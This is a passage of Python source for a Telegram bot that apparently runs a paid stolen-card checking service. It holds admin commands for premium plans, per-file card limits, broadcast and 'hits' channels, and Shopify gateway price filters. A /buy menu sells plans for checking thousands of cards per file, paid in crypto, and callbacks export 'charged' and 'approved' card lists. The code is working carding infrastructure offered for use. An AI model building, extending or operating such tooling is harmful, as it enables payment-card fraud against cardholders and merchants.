        return
    status_msg = await event.reply(premium_emoji("🧹 Cʟᴇᴀʀɪɴɢ API Cᴀᴄʜᴇ..."), parse_mode='html')
    
    timeout = aiohttp.ClientTimeout(total=45)
    
    async def clear_api(api, session):
        for attempt in range(3):
            try:
                async with session.post(f"{api}/cache/clear") as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        cleared = data.get('cleared', 0)
                        return f"✅ <code>{api}</code> (Cʟᴇᴀʀᴇᴅ {cleared} ɪᴛᴇᴍs)"
                    else:
                        if attempt == 2:
                            return f"⚠️ <code>{api}</code> (HTTP {resp.status})"
            except asyncio.TimeoutError:
                if attempt == 2:
                    return f"❌ <code>{api}</code> (Tɪᴍᴇᴏᴜᴛ)"
            except Exception as e:
                if attempt == 2:
                    return f"❌ <code>{api}</code> (Eʀʀᴏʀ: {str(e)})"
            await asyncio.sleep(1.5)

    connector = aiohttp.TCPConnector(use_dns_cache=True, ttl_dns_cache=300)
    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        tasks = [clear_api(api, session) for api in API_SERVERS]
        results = await asyncio.gather(*tasks)
                
    text = "🧹 <b>Cᴀᴄʜᴇ Cʟᴇᴀʀᴇᴅ</b>\n\n" + "\n".join(results)
    await safe_edit(status_msg, premium_emoji(text), parse_mode='html')


@bot.on(events.NewMessage(pattern='/listpremium'))
async def list_premium_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
        
    status_msg = await event.reply(premium_emoji("🔄 Fᴇᴛᴄʜɪɴɢ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴀɴᴅ ᴛʜᴇɪʀ ᴅᴇᴛᴀɪʟs..."), parse_mode='html')
    
    users = await db_manager.get_premium_users_details()
    if not users:
        await safe_edit(status_msg, premium_emoji("📭 Nᴏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ғᴏᴜɴᴅ."), parse_mode='html')
        return

    from datetime import datetime
    now = datetime.now()
    
    parsed_users = []
    for u in users:
        exp_time = None
        remaining_str = "Lifetime"
        if u['expiry']:
            try:
                exp_time = datetime.fromisoformat(u['expiry'])
                if exp_time > now:
                    delta = exp_time - now
                    days = delta.days
                    hours = delta.seconds // 3600
                    remaining_str = f"{days}d {hours}h"
                else:
                    remaining_str = "Expired"
            except:
                pass
        
        parsed_users.append({
            'user_id': u['user_id'],
            'plan': u['plan'] if u['plan'] else 'Premium',
            'exp_time': exp_time,
            'remaining': remaining_str,
            'expiry_raw': u['expiry'][:19].replace('T', ' ') if u['expiry'] else "N/A"
        })

    parsed_users.sort(key=lambda x: x['exp_time'] or datetime.max, reverse=True)
    
    file_content = "👑 PREMIUM USERS LIST 👑\n"
    file_content += "=" * 50 + "\n\n"
    
    for idx, u in enumerate(parsed_users, 1):
        username = "Unknown"
        try:
            entity = await bot.get_entity(u['user_id'])
            if entity.username:
                username = f"@{entity.username}"
            else:
                username = entity.first_name or "Unknown"
        except Exception:
            pass
            
        file_content += f"{idx}. Username: {username} | ID: {u['user_id']}\n"
        file_content += f"   Plan: {u['plan'].upper()}\n"
        file_content += f"   Expires: {u['expiry_raw']}\n"
        file_content += f"   Remaining: {u['remaining']}\n"
        file_content += "-" * 30 + "\n"
        
    filename = "Premium_Users_List.txt"
    import aiofiles
    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write(file_content)
        
    await bot.send_file(
        event.chat_id,
        filename,
        caption=premium_emoji(f"👑 <b>Pʀᴇᴍɪᴜᴍ Usᴇʀs ({len(parsed_users)})</b>\n\nFᴜʟʟ ʟɪsᴛ sᴏʀᴛᴇᴅ ʙʏ ᴇxᴘɪʀʏ:"),
        parse_mode='html',
        reply_to=event.id
    )
    
    import os
    try:
        os.remove(filename)
    except:
        pass
        
    await status_msg.delete()

@bot.on(events.NewMessage(pattern=r'^/addtime(?:\s+(.+))?'))
async def add_time_command(event):
    if event.sender_id not in ADMIN_ID:
        return
        
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Rᴇᴘʟʏ ᴛᴏ ᴀ ᴜsᴇʀ's ᴍᴇssᴀɢᴇ ᴛᴏ ᴀᴅᴅ ᴛɪᴍᴇ!"), parse_mode='html')
        return
        
    try:
        args = event.pattern_match.group(1)
        if not args:
            await event.reply(premium_emoji("❌ Sᴘᴇᴄɪғʏ ᴛɪᴍᴇ (ᴇ.ɢ. /addtime 30 ᴏʀ /addtime 12h)"), parse_mode='html')
            return
            
        args = args.strip().lower()
        delta = None
        if args.endswith('h'):
            hours = int(args[:-1])
            delta = timedelta(hours=hours)
            time_str = f"{hours} Hᴏᴜʀs"
        else:
            days = int(args.replace('d', ''))
            delta = timedelta(days=days)
            time_str = f"{days} Dᴀʏs"
            
        reply_msg = await event.get_reply_message()
        target_id = reply_msg.sender_id
        
        success = await db_manager.add_user_premium_time(target_id, delta)
        
        if success:
            await event.reply(premium_emoji(f"✅ <b>Sᴜᴄᴄᴇss!</b>\n\nAᴅᴅᴇᴅ <b>{time_str}</b> ᴛᴏ ᴜsᴇʀ <code>{target_id}</code>."), parse_mode='html')
            try:
                await bot.send_message(target_id, premium_emoji(f"🎉 <b>Bᴏɴᴜs Tɪᴍᴇ!</b>\n\nAɴ ᴀᴅᴍɪɴ ᴊᴜsᴛ ᴀᴅᴅᴇᴅ <b>{time_str}</b> ᴛᴏ ʏᴏᴜʀ ᴘʀᴇᴍɪᴜᴍ sᴜʙsᴄʀɪᴘᴛɪᴏɴ!"), parse_mode='html')
            except:
                pass
        else:
            await event.reply(premium_emoji(f"❌ <b>Fᴀɪʟᴇᴅ:</b> Usᴇʀ <code>{target_id}</code> ɪs ɴᴏᴛ ᴀɴ ᴀᴄᴛɪᴠᴇ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ!"), parse_mode='html')
            
    except Exception as e:
        await event.reply(premium_emoji(f"❌ <b>Eʀʀᴏʀ:</b> Iɴᴠᴀʟɪᴅ ғᴏʀᴍᴀᴛ ᴏʀ ᴇʀʀᴏʀ ({str(e)}). Usᴇ /addtime 30 ᴏʀ /addtime 12h"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addlimit(?:\s+(.+))?'))
async def add_limit_command(event):
    if event.sender_id not in ADMIN_ID:
        return
        
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Rᴇᴘʟʏ ᴛᴏ ᴀ ᴜsᴇʀ's ᴍᴇssᴀɢᴇ ᴛᴏ ᴀᴅᴅ ʟɪᴍɪᴛ!"), parse_mode='html')
        return
        
    try:
        args = event.pattern_match.group(1)
        if not args:
            await event.reply(premium_emoji("❌ Sᴘᴇᴄɪғʏ ʟɪᴍɪᴛ ᴛᴏ ᴀᴅᴅ (ᴇ.ɢ. /addlimit 4000)"), parse_mode='html')
            return
            
        limit_to_add = int(args.strip())
            
        reply_msg = await event.get_reply_message()
        target_id = reply_msg.sender_id
        
        stats = await db_manager.get_user_stats(target_id)
        if stats.get('plan') == 'free':
            await event.reply(premium_emoji(f"❌ <b>Fᴀɪʟᴇᴅ:</b> Usᴇʀ <code>{target_id}</code> ɪs ɴᴏᴛ ᴀɴ ᴀᴄᴛɪᴠᴇ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ!"), parse_mode='html')
            return
            
        current_limit = stats.get('custom_limit')
        if current_limit is None:
            plan_key = stats.get('plan', 'junior')
            current_limit = PLANS.get(plan_key, PLANS['junior'])['cards_per_file']
            
        new_limit = current_limit + limit_to_add
        await db_manager.set_custom_limit(target_id, new_limit)
        
        await event.reply(premium_emoji(f"✅ <b>Sᴜᴄᴄᴇss!</b>\n\nIɴᴄʀᴇᴀsᴇᴅ ᴄᴀʀᴅ ʟɪᴍɪᴛ ʙʏ <b>{limit_to_add}</b> ғᴏʀ ᴜsᴇʀ <code>{target_id}</code>.\n(Nᴇᴡ ʟɪᴍɪᴛ: {new_limit})"), parse_mode='html')
        try:
            await bot.send_message(target_id, premium_emoji(f"🚀 <b>Lɪᴍɪᴛ Bᴏᴏsᴛ!</b>\n\nAɴ ᴀᴅᴍɪɴ ᴊᴜsᴛ ɪɴᴄʀᴇᴀsᴇᴅ ʏᴏᴜʀ ᴍᴀx ᴄᴀʀᴅs ᴘᴇʀ ғɪʟᴇ ʟɪᴍɪᴛ!\n\nYᴏᴜ ᴄᴀɴ ɴᴏᴡ ᴄʜᴇᴄᴋ ᴜᴘ ᴛᴏ <b>{new_limit}</b> ᴄᴀʀᴅs ᴀᴛ ᴏɴᴄᴇ!"), parse_mode='html')
        except:
            pass
            
    except ValueError:
        await event.reply(premium_emoji("❌ <b>Eʀʀᴏʀ:</b> Lɪᴍɪᴛ ᴍᴜsᴛ ʙᴇ ᴀ ᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ."), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ <b>Eʀʀᴏʀ:</b> {str(e)}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addadmin(?:\s+(.+))?'))
async def add_admin_command(event):
    if event.sender_id not in ADMIN_ID:
        return
        
    try:
        args = event.pattern_match.group(1)
        target_id = None
        
        if event.reply_to_msg_id:
            reply_msg = await event.get_reply_message()
            target_id = reply_msg.sender_id
        elif args:
            target_id = int(args.strip())
            
        if not target_id:
            await event.reply(premium_emoji("❌ Rᴇᴘʟʏ ᴛᴏ ᴀ ᴜsᴇʀ's ᴍᴇssᴀɢᴇ ᴏʀ ᴘʀᴏᴠɪᴅᴇ ᴛʜᴇɪʀ ID ᴛᴏ ᴘʀᴏᴍᴏᴛᴇ ᴛʜᴇᴍ!"), parse_mode='html')
            return
            
        if target_id in ADMIN_ID:
            await event.reply(premium_emoji("⚠️ ᴛʜᴀᴛ ᴜsᴇʀ ɪs ᴀʟʀᴇᴀᴅʏ ᴀɴ ᴀᴅᴍɪɴ."), parse_mode='html')
            return
            
        ADMIN_ID.append(target_id)
        with open(ADMIN_FILE, 'w') as f:
            json.dump(ADMIN_ID, f)
            
        await event.reply(premium_emoji(f"👑 <b>Sᴜᴄᴄᴇss!</b>\n\nUsᴇʀ <code>{target_id}</code> ʜᴀs ʙᴇᴇɴ ᴘʀᴏᴍᴏᴛᴇᴅ ᴛᴏ Aᴅᴍɪɴ!"), parse_mode='html')
        try:
            await bot.send_message(target_id, premium_emoji("👑 <b>Yᴏᴜ'ᴠᴇ ʙᴇᴇɴ ᴘʀᴏᴍᴏᴛᴇᴅ ᴛᴏ Aᴅᴍɪɴ!</b>\n\nRᴜɴ /admin ᴛᴏ ᴠɪᴇᴡ ʏᴏᴜʀ ɴᴇᴡ ᴘᴀɴᴇʟ."), parse_mode='html')
        except:
            pass
            
    except ValueError:
        await event.reply(premium_emoji("❌ <b>Eʀʀᴏʀ:</b> ID ᴍᴜsᴛ ʙᴇ ᴀ ᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ."), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ <b>Eʀʀᴏʀ:</b> {str(e)}"), parse_mode='html')


@bot.on(events.NewMessage(pattern='/buy'))
async def buy_command(event):
    plans_text = """🛒 <b>Pʀᴇᴍɪᴜᴍ Pʟᴀɴs</b> 🛒

<i>Uᴘɢʀᴀᴅᴇ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ᴛᴏ ᴜɴʟᴏᴄᴋ ʜɪɢʜᴇʀ ʟɪᴍɪᴛs ᴀɴᴅ ғᴀsᴛᴇʀ ᴄʜᴇᴄᴋs!</i>

🔹 <b>Wᴇᴇᴋʟʏ Pʟᴀɴ (Jᴜɴɪᴏʀ) - $3</b>
  • 7 Dᴀʏs Aᴄᴄᴇss
  • 2,000 Cᴀʀᴅs ᴘᴇʀ Fɪʟᴇ (/chk)
  • 5 Sᴇᴄᴏɴᴅs Cᴏᴏʟᴅᴏᴡɴ

🔹 <b>2 Wᴇᴇᴋs Pʟᴀɴ (Pʀᴏ) - $5</b>
  • 14 Dᴀʏs Aᴄᴄᴇss
  • 3,500 Cᴀʀᴅs ᴘᴇʀ Fɪʟᴇ (/chk)
  • 2 Sᴇᴄᴏɴᴅs Cᴏᴏʟᴅᴏᴡɴ

👑 <b>1 Mᴏɴᴛʜ Pʟᴀɴ (Pʀᴇᴍɪᴜᴍ) - $9</b>
  • 30 Dᴀʏs Aᴄᴄᴇss
  • 5,000 Cᴀʀᴅs ᴘᴇʀ Fɪʟᴇ (/chk)
  • 0 Sᴇᴄᴏɴᴅs Cᴏᴏʟᴅᴏᴡɴ (Zᴇʀᴏ Dᴇʟᴀʏ)

💎 <i>Pᴀʏᴍᴇɴᴛ Mᴇᴛʜᴏᴅs: Cʀʏᴘᴛᴏ (USDT/BTC/LTC)</i>"""

    buy_button = [[Button.url("🛒 Pᴜʀᴄʜᴀsᴇ Nᴏᴡ", "https://t.me/OwnerGhostHex")]]
    await event.reply(premium_emoji(plans_text), buttons=buy_button, parse_mode='html')

@bot.on(events.NewMessage(pattern='/health'))
async def health_command(event):
    if event.sender_id not in ADMIN_ID:
        return
    status_msg = await event.reply(premium_emoji("🔄 Cʜᴇᴄᴋɪɴɢ API Sᴇʀᴠᴇʀs..."), parse_mode='html')
    results = []
    
    timeout = aiohttp.ClientTimeout(total=10)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        for api in API_SERVERS:
            try:
                start = time.time()
                async with session.get(f"{api}/health") as resp:
                    elapsed = int((time.time() - start) * 1000)
                    if resp.status == 200:
                        results.append(f"✅ <code>{api}</code> ({elapsed}ms)")
                    else:
                        results.append(f"⚠️ <code>{api}</code> (HTTP {resp.status})")
            except Exception as e:
                results.append(f"❌ <code>{api}</code> (Dᴇᴀᴅ)")
                
    text = "🌐 <b>API Hᴇᴀʟᴛʜ Sᴛᴀᴛᴜs</b>\n\n" + "\n".join(results)
    text += f"\n\n📊 Aᴄᴛɪᴠᴇ: {len(ACTIVE_API_SERVERS)}/{len(API_SERVERS)}"
    await safe_edit(status_msg, premium_emoji(text), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/(info|id|mystats)(?:\s|$)'))
async def info_command(event):
    if event.reply_to_msg_id:
        reply_msg = await event.get_reply_message()
        target_sender = await reply_msg.get_sender()
        target_id = reply_msg.sender_id
        username = target_sender.username if target_sender and getattr(target_sender, 'username', None) else "None"
        first_name = target_sender.first_name if target_sender and getattr(target_sender, 'first_name', None) else "User"
    else:
        target_sender = await event.get_sender()
        target_id = event.sender_id
        username = target_sender.username if target_sender and getattr(target_sender, 'username', None) else "None"
        first_name = target_sender.first_name if target_sender and getattr(target_sender, 'first_name', None) else "User"

    stats = await db_manager.get_user_stats(target_id)
    plan_key = stats.get('plan', 'junior')
    is_prem = await is_premium(target_id)
    
    if is_prem:
        plan_name = f"⭐ Pʀᴇᴍɪᴜᴍ ({plan_key.title()})"
    else:
        plan_name = "🆓 Fʀᴇᴇ"
        
    expiry_text = "N/A"
    if is_prem and stats.get('premium_expiry'):
        try:
            exp = datetime.fromisoformat(stats['premium_expiry'])
            remaining = exp - datetime.now()
            if remaining.total_seconds() > 0:
                days = remaining.days
                hours = remaining.seconds // 3600
                expiry_text = f"{days}d {hours}h remaining"
            else:
                expiry_text = "Expired"
        except:
            expiry_text = stats['premium_expiry']
            
    info_text = f"""━━━━━━━━━━━━━━━━━━
▸ 👤 Nᴀᴍᴇ · {first_name}
▸ 🆔 ID · <code>{target_id}</code>
▸ 🌐 Usᴇʀɴᴀᴍᴇ · @{username}
▸ 👑 Pʟᴀɴ · {plan_name}
━━━━━━━━━━━━━━━━━━

📊 <b>Sᴛᴀᴛɪsᴛɪᴄs</b>
💳 <b>Cʜᴇᴄᴋɪɴɢ</b>
  ┣ Sᴇssɪᴏɴs: <code>{stats.get('total_sessions', 0)}</code>
  ┣ Cᴀʀᴅs Cʜᴇᴄᴋᴇᴅ: <code>{stats.get('total_cards', 0)}</code>
  ┣ 💎 Cʜᴀʀɢᴇᴅ: <code>{stats.get('total_charged', 0)}</code>
  ┣ ✅ Aᴘᴘʀᴏᴠᴇᴅ: <code>{stats.get('total_approved', 0)}</code>
  ┣ ❌ Dᴇᴀᴅ: <code>{stats.get('total_dead', 0)}</code>
  ┗ 📈 Hɪᴛ Rᴀᴛᴇ: <code>{stats.get('hit_rate', 0)}%</code>"""

    if is_prem:
        info_text += f"""

⭐ <b>Pʀᴇᴍɪᴜᴍ</b>
  ┗ Exᴘɪʀʏ: <code>{expiry_text}</code>"""

    info_text += "\n\n💡 <i>Mᴀᴅᴇ ʙʏ @OwnerGhostHex</i>"
    await event.reply(premium_emoji(info_text), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/(brod|broadcast)(?:\s|$)'))
async def broadcast_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Pʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇssᴀɢᴇ (ᴛᴇxᴛ, ᴘʜᴏᴛᴏ, ᴠɪᴅᴇᴏ, ᴏʀ ғɪʟᴇ) ᴡɪᴛʜ <code>/brod</code> ᴛᴏ ʙʀᴏᴀᴅᴄᴀsᴛ ɪᴛ ᴛᴏ ᴀʟʟ ʙᴏᴛ ᴜsᴇʀs ᴀɴᴅ ɢʀᴏᴜᴘs."), parse_mode='html')
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg:
        await event.reply(premium_emoji("❌ Cᴏᴜʟᴅ ɴᴏᴛ ɢᴇᴛ ᴛʜᴇ ʀᴇᴘʟɪᴇᴅ ᴍᴇssᴀɢᴇ."), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji(f"🚀 <b>Pʀᴇᴘᴀʀɪɴɢ Bʀᴏᴀᴅᴄᴀsᴛ...</b>\n\nFᴇᴛᴄʜɪɴɢ ᴀʟʟ ᴜsᴇʀs..."), parse_mode='html')

    targets = set()
    db_users = await load_all_bot_users()
    for u in db_users:
        targets.add(u)
        
    targets_list = list(targets)

    await safe_edit(status_msg, premium_emoji(f"🚀 <b>Sᴛᴀʀᴛɪɴɢ Bʀᴏᴀᴅᴄᴀsᴛ...</b>\n\n👥 Tᴀʀɢᴇᴛ Cʜᴀᴛs: {len(targets_list)}"), parse_mode='html')

    sent = 0
    failed = 0

    for i, target in enumerate(targets_list):
        try:
            await bot.forward_messages(target, reply_msg)
            sent += 1
        except FloodWaitError as e:
            if e.seconds > 10:
                # Stop broadcast if Telegram tells us to wait too long to prevent token bans
                break
            await asyncio.sleep(e.seconds)
            try:
                await bot.forward_messages(target, reply_msg)
                sent += 1
            except Exception:
                failed += 1
        except Exception:
            failed += 1

        if (i + 1) % 10 == 0:
            try:
                await safe_edit(status_msg, premium_emoji(f"🚀 <b>Bʀᴏᴀᴅᴄᴀsᴛɪɴɢ...</b>\n\n✅ Sᴇɴᴛ: {sent}\n❌ Fᴀɪʟᴇᴅ: {failed}\n📊 Pʀᴏɢʀᴇss: {i+1}/{len(targets_list)}"), parse_mode='html')
            except Exception:
                pass
        
        # Respect Telegram bot broadcast limits (max ~1 msg/sec across unique chats)
        await asyncio.sleep(1.0)

    await safe_edit(status_msg, premium_emoji(f"""✅ <b>Bʀᴏᴀᴅᴄᴀsᴛ Cᴏᴍᴘʟᴇᴛᴇᴅ!</b>

👥 Tᴏᴛᴀʟ Tᴀʀɢᴇᴛs: {len(targets_list)}
✅ Sᴇɴᴛ Sᴜᴄᴄᴇssғᴜʟʟʏ: {sent}
❌ Fᴀɪʟᴇᴅ/Bʟᴏᴄᴋᴇᴅ: {failed}"""), parse_mode='html')


@bot.on(events.NewMessage(pattern='/sethits'))
async def set_hits_channel(event):
    if event.sender_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Aᴅᴍɪɴ ᴏɴʟʏ."), parse_mode='html')
        return
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/sethits -1001234567890</code>"), parse_mode='html')
            return
        global HITS_CHANNEL_ID
        HITS_CHANNEL_ID = int(parts[1])
        await event.reply(premium_emoji(f"✅ Hɪᴛs ᴄʜᴀɴɴᴇʟ sᴇᴛ ᴛᴏ: <code>{HITS_CHANNEL_ID}</code>"), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern='/hits'))
async def toggle_hits(event):
    if event.sender_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Aᴅᴍɪɴ ᴏɴʟʏ."), parse_mode='html')
        return
    global HITS_CHANNEL_ID
    if HITS_CHANNEL_ID == 0:
        await event.reply(premium_emoji("❌ Hɪᴛs ᴄʜᴀɴɴᴇʟ ɴᴏᴛ sᴇᴛ. Usᴇ /sᴇᴛʜɪᴛs"), parse_mode='html')
        return
    if HITS_CHANNEL_ID < 0:
        HITS_CHANNEL_ID = abs(HITS_CHANNEL_ID)
        await event.reply(premium_emoji("❌ Hɪᴛs ᴄʜᴀɴɴᴇʟ Tᴜʀɴᴇᴅ Oғғ"), parse_mode='html')
    else:
        HITS_CHANNEL_ID = -abs(HITS_CHANNEL_ID)
        await event.reply(premium_emoji("✅ Hɪᴛs ᴄʜᴀɴɴᴇʟ Tᴜʀɴᴇᴅ Oɴ"), parse_mode='html')


@bot.on(events.NewMessage(pattern='/setfilter'))
async def set_filter_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    try:
        parts = event.raw_text.split(maxsplit=3)
        if len(parts) < 4:
            await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/setfilter ɢᴀᴛᴇᴡᴀʏ ᴍɪɴ-ᴍᴀx \"Fɪʟᴛᴇʀ Nᴀᴍᴇ\"</code>\n\nExᴀᴍᴘʟᴇ:\n<code>/setfilter shopify_global 0-10 💰 Lᴇss ᴛʜᴀɴ $10</code>"), parse_mode='html')
            return
        gateway = parts[1]
        range_str = parts[2]
        name = parts[3].strip()
        if '-' not in range_str:
            await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ ʀᴀɴɢᴇ! Usᴇ: ᴍɪɴ-ᴍᴀx"), parse_mode='html')
            return
        min_val, max_val = map(float, range_str.split('-'))
        filters = await load_price_filters()
        if gateway not in filters:
            filters[gateway] = []
        filters[gateway].append({"name": name, "min": min_val, "max": max_val})
        await save_price_filters(filters)
        await event.reply(premium_emoji(f"✅ Fɪʟᴛᴇʀ ᴀᴅᴅᴇᴅ: {name}\n💰 {min_val:.0f} - {max_val:.0f}"), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern='/listfilters'))
async def list_filters_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    filters = await load_price_filters()
    if not filters:
        await event.reply(premium_emoji("📭 Nᴏ ғɪʟᴛᴇʀs ғᴏᴜɴᴅ."), parse_mode='html')
        return
    text = premium_emoji("🔧 <b>Pʀɪᴄᴇ Fɪʟᴛᴇʀs</b>\n\n")
    for gateway, gateway_filters in filters.items():
        text += premium_emoji(f"🛒 <b>{gateway.upper()}</b>\n")
        for i, f in enumerate(gateway_filters, 1):
            text += premium_emoji(
                f"   {i}. {f['name']} ({f['min']:.0f}-{f['max']:.0f})\n")
        text += "\n"
    await event.reply(premium_emoji(text), parse_mode='html')


@bot.on(events.NewMessage(pattern='/removefilter'))
async def remove_filter_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    try:
        parts = event.raw_text.split()
        if len(parts) != 3:
            await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/removefilter ɢᴀᴛᴇᴡᴀʏ ɴᴜᴍʙᴇʀ</code>\n\nExᴀᴍᴘʟᴇ:\n<code>/removefilter shopify_global 2</code>"), parse_mode='html')
            return
        gateway = parts[1].lower()
        filter_num = int(parts[2]) - 1
        filters = await load_price_filters()
        if gateway not in filters:
            await event.reply(premium_emoji(f"❌ Nᴏ ғɪʟᴛᴇʀs ғᴏʀ {gateway.upper()}!"), parse_mode='html')
            return
        if filter_num < 0 or filter_num >= len(filters[gateway]):
            await event.reply(premium_emoji(f"❌ Iɴᴠᴀʟɪᴅ ғɪʟᴛᴇʀ ɴᴜᴍʙᴇʀ! Usᴇ 1-{len(filters[gateway])}"), parse_mode='html')
            return
        removed = filters[gateway].pop(filter_num)
        await save_price_filters(filters)
        await event.reply(premium_emoji(f"✅ Fɪʟᴛᴇʀ ʀᴇᴍᴏᴠᴇᴅ:\n┣ 📌 {removed['name']}\n┗ 💰 {removed['min']:.0f}-{removed['max']:.0f}"), parse_mode='html')
    except ValueError:
        await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ ғɪʟᴛᴇʀ ɴᴜᴍʙᴇʀ!"), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')


@bot.on(events.CallbackQuery(pattern=re.compile(r"shopify_export_(charged|approved):(\d+)")))
async def shopify_export_callback(event):
    match = event.pattern_match
    export_type = match.group(1).decode()
    user_id = int(match.group(2).decode())

    if event.sender_id != user_id:
        await event.answer("❌ Nᴏᴛ ʏᴏᴜʀ ʀᴇsᴜʟᴛs!", alert=True)
        return

    if user_id not in SHOPIFY_SESSION_RESULTS:
        await event.answer("❌ Nᴏ ʀᴇsᴜʟᴛs ғᴏᴜɴᴅ! Rᴜɴ ᴀ ᴄʜᴇᴄᴋ ғɪʀsᴛ.", alert=True)
        return

    user_results = SHOPIFY_SESSION_RESULTS[user_id]

    if export_type == "charged":
        cards_list = user_results.get('charged', [])
        filename = f"charged_cards_@mini_shopiiify_bot.txt"
        title = "CHARGED CARDS"
        emoji = "💎"
    else:
        cards_list = user_results.get('approved', [])
        filename = f"approved_cards_@mini_shopiiify_bot.txt"
        title = "APPROVED CARDS"
        emoji = "✅"

    if not cards_list:
        await event.answer(f"❌ Nᴏ {title.lower()} ғᴏᴜɴᴅ!", alert=True)
        return

    content = f"{emoji} {title}\n"
    content += "=" * 40 + "\n\n"

    for i, item in enumerate(cards_list, 1):
        content += f"[{i}] Cᴀʀᴅ: {item['card']}\n"
        content += f"    Rᴇsᴘᴏɴsᴇ: {item.get('message', 'N/A')[:100]}\n"
        content += f"    Gᴀᴛᴇᴡᴀʏ: {item.get('gateway', 'Unknown')}\n"
        content += f"    Pʀɪᴄᴇ: {item.get('price', '-')}\n"
        content += "-" * 30 + "\n"

    content += f"\n📊 Tᴏᴛᴀʟ: {len(cards_list)} ᴄᴀʀᴅs\n"
    content += f"📅 Exᴘᴏʀᴛᴇᴅ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write(content)

    await event.answer(f"📤 Exᴘᴏʀᴛɪɴɢ {len(cards_list)} ᴄᴀʀᴅs...", alert=False)
    await bot.send_file(
        event.sender_id,
        filename,
        caption=premium_emoji(
            f"<b>{title}</b>\n Tᴏᴛᴀʟ: {len(cards_list)} ᴄᴀʀᴅs")
    )

    try:
        os.remove(filename)
    except:
        pass


@bot.on(events.CallbackQuery(pattern=re.compile(r"shopify_export_errors:(\d+)")))
async def shopify_export_errors_callback(event):
    match = event.pattern_match
    user_id = int(match.group(1).decode())

    if event.sender_id != user_id and event.sender_id not in ADMIN_ID:
        await event.answer("❌ Nᴏᴛ ʏᴏᴜʀ ʀᴇsᴜʟᴛs!", alert=True)
        return

    if user_id not in SHOPIFY_SESSION_RESULTS:
        await event.answer("❌ Nᴏ ʀᴇsᴜʟᴛs ғᴏᴜɴᴅ!", alert=True)
        return

    user_results = SHOPIFY_SESSION_RESULTS[user_id]
    errors_list = user_results.get('errors', [])

    if not errors_list:
        await event.answer("❌ Nᴏ ᴇʀʀᴏʀs ғᴏᴜɴᴅ!", alert=True)
        return

    filename = f"errors_cards_@mini_shopiiify_bot.txt"
    title = "ERROR CARDS"
    emoji = "⚠️"

    content = f"{emoji} {title}\n"
    content += "=" * 40 + "\n\n"

    for i, item in enumerate(errors_list, 1):
        content += f"[{i}] Cᴀʀᴅ: {item['card']}\n"
        content += f"    Rᴇsᴘᴏɴsᴇ: {item.get('message', 'N/A')[:100]}\n"
        content += f"    Gᴀᴛᴇᴡᴀʏ: {item.get('gateway', 'Unknown')}\n"
        content += f"    Pʀɪᴄᴇ: {item.get('price', '-')}\n"
        content += "-" * 30 + "\n"

    content += f"\n📊 Tᴏᴛᴀʟ: {len(errors_list)} ᴄᴀʀᴅs\n"
    content += f"📅 Exᴘᴏʀᴛᴇᴅ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write(content)

    await event.answer(f"📤 Exᴘᴏʀᴛɪɴɢ {len(errors_list)} ᴄᴀʀᴅs...", alert=False)
    await bot.send_file(
        event.sender_id,
        filename,
        caption=premium_emoji(
            f"<b>{title}</b>\n Tᴏᴛᴀʟ: {len(errors_list)} ᴄᴀʀᴅs")
    )

    try:
        os.remove(filename)
    except:
        pass


@bot.on(events.NewMessage(pattern=r'/split'))
async def split_file(event):
    user_id = event.sender_id

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Pʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ .ᴛxᴛ ғɪʟᴇ."), parse_mode='html')
        return

    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
